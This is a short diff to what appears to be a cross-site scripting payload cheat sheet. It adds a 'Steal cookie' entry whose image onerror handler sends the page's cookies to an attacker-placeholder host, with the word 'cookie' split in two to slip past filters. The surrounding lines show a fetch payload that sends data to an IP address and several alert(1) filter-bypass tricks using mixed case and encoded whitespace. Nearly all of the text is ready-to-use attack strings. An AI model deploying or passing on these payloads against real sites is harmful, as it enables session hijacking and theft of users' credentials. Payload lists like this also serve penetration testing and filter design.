@@ -16,6 +16,10 @@ Base64 encoded payload: fetch('http://10.201.82.177:8000/'+encodeURIComponent(do
 
     <scrIpT>aLerT(1)</scrIpT>
 
+Steal cookie
+
+    <ImG src=x onerror=this.src="http://<ip>/?c="+document["co"+"okie"]>
+
 ### 4) White Space and Delimiters
 
     <a/href=j&#x0D;avascript:a&#x0D;lert(1)>aaa</a>
